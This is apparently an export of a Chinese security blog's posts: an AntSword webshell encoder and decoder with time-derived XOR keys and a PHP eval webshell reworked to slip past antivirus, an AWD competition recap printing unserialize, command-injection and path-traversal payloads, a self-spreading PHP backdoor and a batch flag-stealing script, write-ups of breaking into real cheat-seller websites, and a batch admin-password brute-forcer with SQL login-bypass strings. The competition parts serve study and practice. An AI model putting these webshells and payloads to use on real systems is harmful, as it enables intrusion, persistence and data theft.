时-分的时间格式，然后md5一次，来作为我们的随机秘钥。思路与实现蚁剑获取时间-&gt;生成随机秘钥-&gt;加密payload-&gt;发送给shellshell获取时间-&gt;生成随机秘钥-&gt;解密payload-&gt;将回显data编码-&gt;返回给蚁剑蚁剑获取时间-&gt;生成随机秘钥-&gt;解密返回data-&gt;获取信息要注意的是因为基于时间产生秘钥，所以要保证你的时区是跟shell的时区是一致的。因为我本地蚁剑是北京时间，所以在shell中也强制设置为北京时间。动态秘钥编码器不得不说一个坑同样一句console.log(new Date().toLocaleString());在node中是24小时制在浏览器跟蚁剑中是12小时制被坑了好久没发现。。。干脆重新确定一个24小时制的规范时间格式，也方便后期自定义修改123456789101112131415161718192021222324252627Object.assign(Date.prototype, &#123; switch (time) &#123; let date = &#123; &quot;yy&quot;: this.getFullYear(), &quot;MM&quot;: this.getMonth() + 1, &quot;dd&quot;: this.getDate(), &quot;hh&quot;: this.getHours(), &quot;mm&quot;: this.getMinutes(), &quot;ss&quot;: this.getSeconds() &#125;; if (/(y+)/i.test(time)) &#123; time = time.replace(RegExp.$1, (this.getFullYear() + &apos;&apos;).substr(4 - RegExp.$1.length)); &#125; Object.keys(date).forEach(function (i) &#123; if (new RegExp(&quot;(&quot; + i + &quot;)&quot;).test(time)) &#123; if (RegExp.$1.length == 2) &#123; date[i] &lt; 10 ? date[i] = &apos;0&apos; + date[i] : date[i]; &#125; time = time.replace(RegExp.$1, date[i]); &#125; &#125;) return time; &#125; &#125;) let newDate = new Date(); let time = newDate.switch(&apos;yyyy-MM-dd hh:mm&apos;);所以demo是这样的12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&apos;use strict&apos;;// code by yzddmr6/** @param &#123;String&#125; pwd 连接密码* @param &#123;Array&#125; data 编码器处理前的 payload 数组* @return &#123;Array&#125; data 编码器处理后的 payload 数组*/module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123; function xor(payload)&#123; let crypto = require(&apos;crypto&apos;); Object.assign(Date.prototype, &#123; switch (time) &#123; let date = &#123; &quot;yy&quot;: this.getFullYear(), &quot;MM&quot;: this.getMonth() + 1, &quot;dd&quot;: this.getDate(), &quot;hh&quot;: this.getHours(), &quot;mm&quot;: this.getMinutes(), &quot;ss&quot;: this.getSeconds() &#125;; if (/(y+)/i.test(time)) &#123; time = time.replace(RegExp.$1, (this.getFullYear() + &apos;&apos;).substr(4 - RegExp.$1.length)); &#125; Object.keys(date).forEach(function (i) &#123; if (new RegExp(&quot;(&quot; + i + &quot;)&quot;).test(time)) &#123; if (RegExp.$1.length == 2) &#123; date[i] &lt; 10 ? date[i] = &apos;0&apos; + date[i] : date[i]; &#125; time = time.replace(RegExp.$1, date[i]); &#125; &#125;) return time; &#125; &#125;) let newDate = new Date(); let time = newDate.switch(&apos;yyyy-MM-dd hh:mm&apos;); let key = crypto.createHash(&apos;md5&apos;).update(time).digest(&apos;hex&apos;) key=key.split(&quot;&quot;).map(t =&gt; t.charCodeAt(0)); //let payload=&quot;phpinfo();&quot;; let cipher = payload.split(&quot;&quot;).map(t =&gt; t.charCodeAt(0)); for(let i=0;i&lt;cipher.length;i++)&#123; cipher[i]=cipher[i]^key[i%32] &#125; cipher=cipher.map(t=&gt;String.fromCharCode(t)).join(&quot;&quot;) cipher=Buffer.from(cipher).toString(&apos;base64&apos;); //console.log(cipher) return cipher; &#125; data[&apos;_&apos;] = Buffer.from(data[&apos;_&apos;]).toString(&apos;base64&apos;); data[pwd] = `eval(base64_decode(&quot;$&#123;data[&apos;_&apos;]&#125;&quot;));`; data[pwd]=xor(data[pwd]); delete data[&apos;_&apos;]; return data;&#125;动态秘钥解码器1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&apos;use strict&apos;;//code by yzddmr6module.exports = &#123; /** * @returns &#123;string&#125; asenc 将返回数据base64编码 * 自定义输出函数名称必须为 asenc * 该函数使用的语法需要和shell保持一致 */ asoutput: () =&gt; &#123; return `function asenc($out)&#123; date_default_timezone_set(&quot;PRC&quot;); $key=md5(date(&quot;Y-m-d H:i&quot;,time())); for($i=0;$i&lt;strlen($out);$i++)&#123; $out[$i] = $out[$i] ^ $key[$i%32]; &#125; return @base64_encode($out); &#125; `.replace(/\n\s+/g, &apos;&apos;); &#125;, /** * 解码 Buffer * @param &#123;string&#125; data 要被解码的 Buffer * @returns &#123;string&#125; 解码后的 Buffer */ decode_buff: (data, ext=&#123;&#125;) =&gt; &#123; function xor(payload)&#123; let crypto = require(&apos;crypto&apos;); Object.assign(Date.prototype, &#123; switch (time) &#123; let date = &#123; &quot;yy&quot;: this.getFullYear(), &quot;MM&quot;: this.getMonth() + 1, &quot;dd&quot;: this.getDate(), &quot;hh&quot;: this.getHours(), &quot;mm&quot;: this.getMinutes(), &quot;ss&quot;: this.getSeconds() &#125;; if (/(y+)/i.test(time)) &#123; time = time.replace(RegExp.$1, (this.getFullYear() + &apos;&apos;).substr(4 - RegExp.$1.length)); &#125; Object.keys(date).forEach(function (i) &#123; if (new RegExp(&quot;(&quot; + i + &quot;)&quot;).test(time)) &#123; if (RegExp.$1.length == 2) &#123; date[i] &lt; 10 ? date[i] = &apos;0&apos; + date[i] : date[i]; &#125; time = time.replace(RegExp.$1, date[i]); &#125; &#125;) return time; &#125; &#125;) let newDate = new Date(); let time = newDate.switch(&apos;yyyy-MM-dd hh:mm&apos;); let key = crypto.createHash(&apos;md5&apos;).update(time).digest(&apos;hex&apos;) key = key.split(&quot;&quot;).map(t =&gt; t.charCodeAt(0)); let data = payload; let cipher=Buffer.from(data.toString(), &apos;base64&apos;).toString(); cipher = cipher.split(&quot;&quot;).map(t =&gt; t.charCodeAt(0)); for (let i = 0; i &lt; cipher.length; i++) &#123; cipher[i] = cipher[i] ^ key[i % 32] &#125; cipher=cipher.map(t=&gt;String.fromCharCode(t)).join(&quot;&quot;) return cipher; &#125; return xor(data); &#125;&#125;但是发现遇到中文会乱码，所以仅作为一个参考吧服务端原型123456789&lt;?phpdate_default_timezone_set(&quot;PRC&quot;);@$post=base64_decode($_REQUEST[&apos;yzddmr6&apos;]);$key=md5(date(&quot;Y-m-d H:i&quot;,time()));for($i=0;$i&lt;strlen($post);$i++)&#123; $post[$i] = $post[$i] ^ $key[$i%32];&#125;eval($post);?&gt;D盾4级，稍微处理一下让他免杀1234567891011121314&lt;?phpdate_default_timezone_set(&quot;PRC&quot;);$key=md5(date(&quot;Y-m-d H:i&quot;,time()));class TEST&#123; function encode($key)&#123; @$post=base64_decode($_REQUEST[&apos;test&apos;]); for($i=0;$i&lt;strlen($post);$i++)&#123;$post[$i] = $post[$i] ^ $key[$i%32];&#125; return $post;&#125; function ant($data) &#123;return eval($this-&gt;encode(&quot;$data&quot;));&#125;&#125;$test=new TEST;$test-&gt;ant($key);?&gt;测试在蚁剑中新建编码器 解码器，然后起一个你喜欢的名字，把上面的代码复制进去即可。配置一下就可以使用啦没错，我用的就是著名的backdoorstudy你可以同时使用动态秘钥编码器跟动态秘钥解码器，也可以只使用编码器，或者动态编码器跟其他解码器结合。要注意的是，因为一些玄学问题，当你使用了demo中的动态解码器后遇见中文会乱码。个人建议 动态秘钥编码器+base64解码器 就差不多了。最后在demo中用的是年-月-日 时-分的时间格式，可能过不了多久也会被检测。如果以后被加入豪华午餐的话，自己可以自由修改日期的格式，例如日-年-月 时-分，或者 日期+盐 来达到混淆的效果在编码器中已经留好了日期格式修改的接口，换一换顺序即可。通过以上操作我们已经实现了无需握手传递秘钥的编码器解码器到这里好像没什么问题了但是发现蚁剑默认的payload会把data[]数组中其他的参数只是base64一遍这样的流量还是容易被检测出，这也是蚁剑的硬伤。在这篇文章里WAF拦了蚁剑发送的其它参数时怎么操作蚁剑作者也给出了解决方案但是这样修改的话只是针对一个编码器，不能对所有的编码器有效最稳固的办法还是自己修改蚁剑硬编码的payload，来满足自己的需求。本文只是抛砖引玉，没什么技术含量，还望大佬们轻喷。参考文章https://mp.weixin.qq.com/s/uITAIt-jj3-CYKwXQqFzMwhttps://mp.weixin.qq.com/s/IUs3YbWKSAE2ptAw1nrJyghttps://mp.weixin.qq.com/s/ai3dW8H_ZnlFMPo-pgoqZwhttps://xz.aliyun.com/t/2774]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>中国蚁剑</tag>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[知识星球]WebShell免杀之PHP]]></title>
    <url>%2Fposts%2Fwebshell-bypass-php%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>webshell</tag>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[向吃鸡外挂站开炮（二）]]></title>
    <url>%2Fposts%2Fhack-pubg-cheat-site-2%2F</url>
    <content type="text"><![CDATA[> > 上一篇 [向吃鸡外挂站开炮（一）](https://yzddmr6.tk/posts/hack-pubg-cheat-site-1/)前言首先打开网站我们可以看到他的炫酷界面暖心公告不要脸的宣传词发现注入基于tp3开发,后台/admin尝试万能密码提示密码错误尝试admin admin888 提示账号不存在两者回显不同，考虑可能存在注入无法利用？burp抓包发送到repeater进行进一步测试发现条件为真时返回status: -2，条件为假时返回status: -1进一步印证了猜想，后台存在注入扔到sqlmap跑无法检测出注入，提示一堆404 not found开始以为是cdn封锁了sqlmap的流量，后来发现根本没什么防护。。。虚假的cdn于是考虑可能是cms自身过滤了一些东西绕过过滤经过测试发现只要出现尖括号就会返回404可以用between来绕过这时就继续按照 条件真=&gt;-2 条件假=&gt;-1 来回显也就满足了盲注的条件忽然一想这个情景跟第五空间决赛的那道注入题一毛一样真返回一个页面 假返回另一个页面 出现被过滤字符返回其它页面 并且要用between来绕过CTF诚不欺我所以只要在sqlmap的参数里加上--tamper=between 即可最后数据库里管理员密码用的aes加密，没有秘钥，无法解密。普通用户登录口被关闭，无法注册也无法登录。除了脱出来一堆孤儿的信息其他也没什么用打包一下证据，全部提交有关部门。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[“北极星杯”AWD线上赛复盘]]></title>
    <url>%2Fposts%2Fxm-one-year-awd%2F</url>
    <content type="text"><![CDATA[前言10.3 星盟安全周年庆举办了一场线上AWD比赛参赛队伍总计31支，见到了不少熟悉的ID神仙大战果然被暴打hhhhhh，运气好还水了一个小奖品。学到了不少东西，今天来写一下复盘总结。比赛规则每个队伍分配到一个docker主机，给定web(web)/pwn(pwn)用户权限，通过特定的端口和密码进行连接；每台docker主机上运行一个web服务或者其他的服务，需要选手保证其可用性，并尝试审计代码，攻击其他队伍。选手需自行登录平台熟悉自助式初始化、api提交flag等功能。初始密码为队长所设密码，队长需在比赛开始前10分钟向主办方提交密码，过期未提交视为弃权。选手可以通过使用漏洞获取其他队伍的服务器的权限，读取他人服务器上的flag并提交到平台上。每次成功攻击可获得5分，被攻击者扣除5分；有效攻击五分钟一轮。选手需要保证己方服务的可用性，每次服务不可用，扣除10分；服务检测五分钟一轮；不允许使用任何形式的DOS攻击，第一次发现扣1000分，第二次发现取消比赛资格。比赛最终结果将在10月3日晚19:00-19:30于北极星杯网络安全交流群直播公布，同时会有技术分享及抽奖活动，敬请关注。比赛开始这次比赛3个web 2个pwn首先就是老套路，打包源码跟数据库，然后D盾扫一扫。因为队友的分工是权限维持，自己的分工主要是get flag，就直接看漏洞吧。WEB1预留后门三个冰蝎一个普通一句话难受的就是自己主要是撸批量getflag脚本的，但是冰蝎的shell怎么tm写脚本啊喵喵喵？？？第一时间写好了普通一句话的批量脚本改了改让他自动提交当时大家可能都还没修，手速快就自动交了两轮但是可以看到10队已经上了通防脚本，返回了一个假的flag反序列化sqlhelper.php最下面有这样一句123456789101112if (isset($_POST[&apos;un&apos;]) &amp;&amp; isset($_GET[&apos;x&apos;]))&#123;class A&#123; public $name; public $male; function __destruct()&#123; $a = $this-&gt;name; $a($this-&gt;male); &#125;&#125;unserialize($_POST[&apos;un&apos;]);&#125;$name 传个system $male传个cat /flag 就可以拿到flag了payload:GET: ?x=yzddmr6POST: un=O:1:&quot;A&quot;:2:{s:4:&quot;name&quot;;s:6:&quot;system&quot;;s:4:&quot;male&quot;;s:9:&quot;cat /flag&quot;;};注入上传login.php123456789101112131415161718192021&lt;?phpif (isset($_POST[&apos;username&apos;]))&#123; include_once &quot;../sqlhelper.php&quot;; $username=$_POST[&apos;username&apos;]; $password = md5($_POST[&apos;password&apos;]); $sql = &quot;SELECT * FROM admin where name=&apos;$username&apos; and password=&apos;$password&apos;;&quot;; $help = new sqlhelper(); $res = $help-&gt;execute_dql($sql); echo $sql; if ($res-&gt;num_rows)&#123; session_start(); $row = $res-&gt;fetch_assoc(); $_SESSION[&apos;username&apos;] = $username; $_SESSION[&apos;id&apos;] = $row[&apos;id&apos;]; $_SESSION[&apos;icon&apos;] = $row[&apos;icon&apos;]; echo &quot;&lt;script&gt;alert(&apos;登录成功&apos;);window.location.href=&apos;/&apos;&lt;/script&gt;&quot;; &#125;else&#123; echo &quot;&lt;script&gt;alert(&apos;用户名密码错误&apos;)&lt;/script&gt;&quot;; &#125;&#125;?&gt;可以看到直接把接收到了$username给带入到了sql语句中，产生注入直接用万能密码就可以绕过接着往下看登录之后可以做什么info.php1234567891011121314151617181920212223if (isset($_FILES)) &#123; if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0) &#123; echo &quot;错误：&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;; &#125; else &#123; $type = $_FILES[&quot;file&quot;][&quot;type&quot;]; if($type==&quot;image/jpeg&quot;)&#123; $name =$_FILES[&quot;file&quot;][&quot;name&quot;] ; if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;])) &#123; echo &quot;&lt;script&gt;alert(&apos;文件已经存在&apos;);&lt;/script&gt;&quot;; &#125; else &#123; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;assets/images/avatars/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]); $helper = new sqlhelper(); $sql = &quot;UPDATE admin SET icon=&apos;$name&apos; WHERE id=$_SESSION[id]&quot;; $helper-&gt;execute_dml($sql); &#125; &#125;else&#123; echo &quot;&lt;script&gt;alert(&apos;不允许上传的类型&apos;);&lt;/script&gt;&quot;; &#125; &#125;&#125;可以看到他对文件类型的判断仅仅是if($type==&quot;image/jpeg&quot;) 这里在数据包里修改content-type即可绕过，所上传的文件将会保存在assets/images/avatars/目录下。但是由于平台数据库有点问题，无法进行注入，所以这个洞当时也没利用起来。WEB2web2是web1的升级版，当时少看见一个文件读取的洞，亏死啦！预留后门pww.php跟pass.php都是冰蝎。。。不会写冰蝎的批量脚本，队伍又31个队，就基本没管这个后门index.php里面就是一个普通的一句话命令注入我们可以看到D盾还报了一个exec后门直接把$host双引号里带入然后看一下$host是怎么来的然后看数据是如何放入数据库的在收到$_POST['host']后程序还经过了一层addslashes操作，过滤其中的单双引号还有斜杠但是实际上在执行的$r = exec(&quot;ping -c 1 $host&quot;);这一句中并不需要引号逃逸，所以他的过滤操作并没有什么卵用。因为exec是没有回显的，所以构造以下payload1||cat /flag &gt; /ver/www/html/1.txt把flag输出到网站根目录下好像是需要登录，具体我也忘了任意文件读取img.php1234567&lt;?php$file = $_GET[&apos;img&apos;];$img = file_get_contents(&apos;images/icon/&apos;.$file);//使用图片头输出浏览器header(&quot;Content-Type: image/jpeg;text/html; charset=utf-8&quot;);echo $img;exit;payload:/img.php?img=../../../../../../../flag反序列化同web1，只不过不需要x参数了WEB3能利用起来的好像就这一个洞，当时也没来得及看命令执行export.php1234567&lt;?php if (isset($_POST[&apos;name&apos;]))&#123; $name = $_POST[&apos;name&apos;]; exec(&quot;tar -cf backup/$name images/*.jpg&quot;); echo &quot;&lt;div class=\&quot;alert alert-success\&quot; role=\&quot;alert\&quot;&gt; 导出成功,&lt;a href=&apos;backup/$name&apos;&gt;点击下载&lt;/a&gt;&lt;/div&gt;&quot;&#125;?&gt;老套路，同web2payload: || cat /flag &gt; /var/www/html/1.txt ||艰难的权限维持其实AWD比赛刚开始的时候，最重要的是维持权限而不是急着交flag。当我还在审第一个web的时候，看到预留后门就问队友要不要给他框架弹个shell结果他告诉我框架爆炸了。。。弹shell一直500。。。缓缓打出三个问号。。。喵喵喵？？？以前都是用团队的这个框架没问题，结果今天死活连不上。。。。GG，这tm咋整啊，31个队手工维权玩个毛啊所以就只能搞一些骚操作循环批量GET FLAG撸了一串脚本，来回跑，然后加上接口自动提交，没有框架只能这样了乌鸦坐飞机对，没错，我们就是乌鸦，坐了别的队的飞机。自己靶机的流量日志上发现了别的队伍的payload写了个脚本看了下，几乎所有的队伍都被种上了这个师傅的马不死马循环写入，被删后马上复活你的马看起来不错，下一秒就是我的了。白嫖了好几轮的flag然后闲的没事想着不如连上蚁剑看看吧，找找其他师傅的马批量导入一下看见其他队伍被种了马，满怀热泪的帮他们删了站。有一个队伍被命令注入打惨了，也帮他们删个站吧。当然还看到不少其他队伍的马甚至还有批量上waf的py脚本毕竟是其他队伍的内部脚本，象征性打个码流量日志里还发现一个狼人队伍的循环感染不死马会遍历目录把所有的php文件头部加上后门1&lt;?php if (md5($_REQUEST[&apos;pass&apos;])===&quot;8e68ca4946b8e146a408f727eaf9da7c&quot;)&#123;@eval($_REQUEST[&apos;code&apos;]);@system($_REQUEST[&apos;sys&apos;]);&#125; ?&gt;不过惊讶的是他的md5居然可以解开somd5牛逼！好马，下一秒就是我的了批量脚本走起123456789101112131415161718192021import requestsimport jsonurl=&quot;http://39.100.119.37:&#123;0&#125;&#123;1&#125;80/login/index.php?pass=Happy.Every.Day&amp;code=system(&apos;cat /flag&apos;);&quot;def submit(flag): hosturl=&quot;http://39.100.119.37:10000/commit/flag&quot; data=&#123;&apos;flag&apos;:flag,&quot;token&quot;:&quot;xxxxx&quot;&#125; data=json.dumps(data) r=requests.post(hosturl,data=data,headers=&#123;&quot;Cookie&quot;:&quot;PHPSESSID=xxxxx&quot;,&quot;Content-Type&quot;:&quot;application/json; charset=UTF-8&quot;&#125;) print(r.text)for j in range(1,4): for i in range(1,32): i=str(i).zfill(2) url1=url.format(j,i) print(url1) try: res=requests.get(url=url1) if &apos;flag&apos; in res.text: submit(res.text[0:38]) print(res.text[0:38]) except: pass尾声最后web基本上都修了，payload已经打不动了只能靠不死马来get flag因为开始手快，得分比较多，还有负责修的队友比较给力，掉分不是很多。然而毕竟是白嫖别人的马，所以增长分数的速度越来越慢最后还往后掉了一名，不过还拿个小奖hhhhh总结师傅们一个个都心狠手辣，但是说到最后还是自己有很多没有考虑到的地方。因为框架主要是需要先弹个shell到自己的服务器，然后才能自动维权，get flag等一系列操作但是开始框架崩了后直接懵了，不知道怎么办其实现在想自己完全可以当时重写一个批量种不死马的脚本来维权但是当时31个队伍，三个一堆洞的web，难免有些手忙脚乱。有些队伍的通防很厉害，匹配到关键字直接返回一个假的flag，自己准备也写一个。怀疑他们用的都是一家的脚本。。。。返回的flag都一样最后AWD一般都是线下赛，线上AWD见得还不多。星盟的这个线上赛体验还是很不错的，能够撑住31个队伍，每个队伍5个题也是挺厉害的中途虽然平台有宕机但是很快就恢复了。给星盟点个赞，希望星盟以后越做越好~]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[知识星球]WebShell免杀之ASP]]></title>
    <url>%2Fposts%2Fwebshell-bypass-asp%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>webshell</tag>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[向吃鸡外挂站开炮（一）]]></title>
    <url>%2Fposts%2Fhack-pubg-cheat-site-1%2F</url>
    <content type="text"><![CDATA[前言因为最近吃鸡被外挂打自闭了，所以准备也让那些卖挂的体会一下什么叫做自闭。昨天晚上爬了快1000个卖吃鸡外挂的平台你们这些卖挂的，等我有空了一个一个捶。发现大多数都是用的一套aspx的程序，可惜没有源码不能白盒审计，黑盒也找不到什么洞只能找找软柿子捏昨天晚上一口气锤了四个基本上都有宝塔不过php-venom 4 系列加上配套的编码器过宝塔稳得一批脱了裤子发现里面4000+孤儿今天晚上又锤了一个吃鸡外挂站可惜尴尬的是没有写入权限写篇大水文记录一下正文毫无套路进后台这个应该算是那种推广站，里面什么都没有，只有宣传内容管你是什么，照锤不误。看了一下是织梦二次开发的站后台很容易进，这里大家都明白什么意思。玄学后台发现后台删了很多功能，特别是织梦的坑货文件管理器但是从经验上来说很多这种二次开发的并不是真的把编辑器删掉了，只是在后台页面不显示了。审查元素启动随便找个链接改一下，替换成media_main.php?dopost=filemanager然后点击，果然找到了文件管理器页面上传shell本来以为就这样结束了结果发现虽然提示上传成功但是啥都没有还以为是waf，就换了人畜无害的一张jpg上去也是啥都没有以为是目录权限问题找到session的临时文件，上传，照样不行图就不放了，总之就是传不上去觉得可能是整站没写权限随手试试删除功能，发现可以删文件emmmmm，所以到底是有权限没有呢一般来说没写权限的话也就没有修改权限，也就是没有删除权限想着是不是上传功能坏了，换个方法getshell吧全员gg首先想到的就是改文件，里面放个shell显示csrf token不对搜了搜怎么解决发现是直接改check函数，第一句加上return结果修改config.php 文件也弹这个错误所以就陷入死循环。。。改标签也是一样的错误。然后试了织梦的各个0day，后台代码任意执行提示执行成功了，但是要么404页面，要么就是csrf token报错为啥老是csrf token检测失败，以前就没遇到过这种问题。是我操作不对吗？如果有表哥知道为什么的话麻烦告诉我一下谢谢柳暗花明本来想想算了，然后出去吃了个饭。然后想着既然是弱口令会不会有其他人的后门呢。就想起来织梦有个自带的后门查杀功能同样的审查元素，找到后门查杀功能，开始扫描果然发现可疑文件然后一看全是其他人的后门随便找一个，连接上去getshell最后发现是星外，并且全站没有写入权限，难怪传不上去。。。翻了翻目录，不能跨站，没写权限，无法bypass disable function等于是啥都没有。。。但是神奇的是可以任意文件删除站就不删了，保存一下证据，提交网警。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WebCrack：网站后台弱口令批量检测工具]]></title>
    <url>%2Fposts%2Fwebcrack-release%2F</url>
    <content type="text"><![CDATA[> 经过这么长时间的测试终于算是可以上线了，写篇文章跟大家分享一下自己的开发思路吧 >注：本工具借鉴吸收了TideSec的[web_pwd_common_crack](https://github.com/TideSec/web_pwd_common_crack)很多优秀的思路，在此基础上增加了很多拓展功能使其更加强大，在这里给TideSec的大佬点个赞！前言在做安全测试的时候，随着资产的增多，经常会遇到需要快速检测大量网站后台弱口令的问题。然而市面上并没有一个比较好的解决方案，能够支持对各种网站后台的通用检测。所以WebCrack就应运而生。工具简介WebCrack是一款web后台弱口令/万能密码批量爆破、检测工具。不仅支持如discuz，织梦，phpmyadmin等主流CMS并且对于绝大多数小众CMS甚至个人开发网站后台都有效果在工具中导入后台地址即可进行自动化检测。实现思路大家想一下自己平常是怎么用burpsuite的intruder模块来爆破指定目标后台的1抓包 -&gt; send to intruder -&gt; 标注出要爆破的参数 -&gt; 发送payload爆破 -&gt; 查看返回结果找出返回包长度大小不同的那一个，基本上就是所需要的答案。那么WebCrack就是模拟这个过程但是就要解决两个问题如何自动识别出要爆破的参数如何自动判断是否登录成功识别爆破参数对于这个问题采用了web_pwd_common_crack的解决办法就是根据提取表单中 user pass 等关键字，来判断用户名跟密码参数的位置123456789101112131415if parameter: if not user_key: for z in [ &apos;user&apos;, &apos;name&apos;,&apos;zhanghao&apos;, &apos;yonghu&apos;, &apos;email&apos;, &apos;account&apos;]: if z in parameter.lower(): value = &apos;&#123;user_name&#125;&apos; user_key = parameter ok_flag = 1 break if not ok_flag: for y in [&apos;pass&apos;, &apos;pw&apos;, &apos;mima&apos;]: if y in parameter.lower(): value = &apos;&#123;pass_word&#125;&apos; pass_key = parameter ok_flag = 1 break但是在测试中还发现，有些前端程序员用拼音甚至拼音缩写来给变量命名什么yonghu , zhanghao , yhm(用户名), mima 等虽然看起来很捉急，但是也只能把它们全部加进关键字判断名单里。如何判断登录成功这个可以说是最头疼的问题如果对于一种管理系统还好说，只要找到规律，判断是否存在登录成功的特征就可以但是作为通用爆破脚本来说，世界上的网站各种各样，不可能去一个个找特征，也不可能一个个去正则匹配。经过借鉴web_pwd_common_crack的思路，与大量测试总结出来了以下一套比较有效的判断方式。判断是否动态返回值并获取Error Length先发送两次肯定错误的密码如length_test获取两次返回值并比较如果两次的值不同，则说明此管理系统面对相同的数据包返回却返回不同的长度，此时脚本无法判断，退出爆破。如果相同，则记录下此值，作为判断的基准。然而实际中会先请求一次，因为发现有些管理系统在第一次登录时会在响应头部增加标记。如果去掉此项可能会导致判断失误。判断用户名跟密码的键名是否存在在跳转后的页面中这个不用过多解释，如果存在的话说明没登录成功又退回到登录页面了。有人会问为什么不直接判断两个页面是否相等呢因为测试中发现有些CMS会给你在登录页面弹个登录失败的框，所以直接判断是否相等并不准确。还有一种计算页面哈希的办法，然后判断两者的相似程度。但是觉得并没有那个必要，因为有不同的系统难以用统一的阈值来判断，故舍弃。关键字黑名单检测黑名单关键字列表123[&apos;密码错误&apos;, &apos;重试&apos;, &apos;不正确&apos;, &apos;密码有误&apos;,&apos;不成功&apos;, &apos;重新输入&apos;, &apos;history.back&apos;, &apos;不存在&apos;, &apos;登录失败&apos;,&apos;登陆失败&apos;,&apos;出错&apos;,&apos;已被锁定&apos;,&apos;history.go&apos;,&apos;安全拦截&apos;,&apos;还可以尝试&apos;,&apos;无效&apos;,&apos;攻击行为&apos;,&apos;创宇盾&apos;, &apos;非法&apos;,&apos;百度加速&apos;,&apos;安全威胁&apos;,&apos;防火墙&apos;,&apos;黑客&apos;, &apos;不合法&apos;,&apos;warning.asp?msg=&apos;,&apos;Denied&apos;]本来还设置了白名单检测机制就是如果有“登录成功”的字样出现肯定就是爆破成功但是后来发现并没有黑名单来的必要。因为首先不可能把所有CMS的登录成功的正则样本都放进去其次在测试的过程中，发现在其他检测机制的加持后，白名单的判断变得尤其鸡肋，故舍弃。黑名单就相比而言好的多如果弹出来&quot;密码错误&quot;，就不用再往下判断了然而实际测试中发现有些用js来判断登录的情况的时候，会同时出现“登录成功“，跟“登录失败”的字眼此时就只能通过其他方式判断了。Recheck环节为了提高准确度，防止误报。借鉴了web_pwd_common_crack的思路增加recheck环节。就是再次把crack出的账号密码给发包一次，并且与重新发送的error_length作比对如果不同则为正确密码。在这里没有沿用上一个error_length，是因为在实际测试中发现由于waf或者其他因素会导致返回包长度值变化。框架拓展用上面几种办法组合起来已经可以做到基本的判断算法了但是为了使WebCrack更加强大，我又添加了以下三个模块动态字典实现代码1234567891011121314151617181920212223242526272829303132def gen_dynam_dic(url): dynam_pass_dic = [] tmp_dic = [] suffix_dic = [&apos;&apos;, &apos;123&apos;, &apos;888&apos;, &apos;666&apos;, &apos;123456&apos;] list1 = url.split(&apos;/&apos;) host = list1[2].split(&quot;:&quot;)[0] compile_ip = re.compile(&apos;^(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d)$&apos;) if compile_ip.match(host): check_ip = 1 else: check_ip = 0 if not check_ip: list2 = host.split(&quot;.&quot;) i = len(list2) for u in range(i): list3 = list2[u:] part = &apos;.&apos;.join(list3) if (len(part) &lt; 5): continue dynam_pass_dic.append(part) for u in range(i): list3 = list2[u] if len(list3) &lt; 5: continue tmp_dic.append(list3) for i in tmp_dic: for suffix in suffix_dic: u = i + suffix dynam_pass_dic.append(u) return dynam_pass_dic else: return &apos;&apos;假如域名是1webcrack.yzddmr6.com那么就会生成以下动态字典列表123456789101112webcrack.yzddmr6.comyzddmr6.comwebcrackwebcrack123webcrack888webcrack666webcrack123456yzddmr6yzddmr6123yzddmr6888yzddmr6666yzddmr6123456假如正则匹配到传来的是一个IP而不是域名的话就会返回一个空列表。万能密码检测后台的漏洞除了弱口令还有一大部分是出在万能密码上在WebCrack中也添加了一些常用的payload12345admin&apos; or &apos;a&apos;=&apos;a&apos;or&apos;=&apos;or&apos;admin&apos; or &apos;1&apos;=&apos;1&apos; or 1=1&apos;)or(&apos;a&apos;=&apos;a&apos;or 1=1--但是同时带来个问题会被各大WAF拦截这时候就可以把WAF拦截的关键字写到检测黑名单里，从而大大减少误报。小插曲用webcrack检测目标资产进入到了recheck环节但是webcrack却提示爆破失败。手工测试了一下检测出的万能密码发现出现了sql错误信息意识到可能存在后台post注入发现了sa注入点这也反应了对于后台sql注入，webcrack的正则匹配还做的不够完善，下一个版本改一下。自定义爆破规则有了上面这些机制已经可以爆破大部分网站后台了然而还是有一些特(sha)殊(diao)网站，并不符合上面的一套检测算法于是webcrack就可以让大家自定义爆破规则。自定义规则的配置文件放在同目录cms.json文件里参数说明123456789101112[ &#123; &quot;name&quot;:&quot;这里是cms名称&quot;, &quot;keywords&quot;:&quot;这里是cms后台页面的关键字,是识别cms的关键&quot;, &quot;captcha&quot;:&quot;1为后台有验证码，0为没有。因为此版本并没有处理验证码，所以为1则退出爆破&quot;, &quot;exp_able&quot;:&quot;是否启用万能密码模块爆破&quot;, &quot;success_flag&quot;:&quot;登录成功后的页面的关键字&quot;, 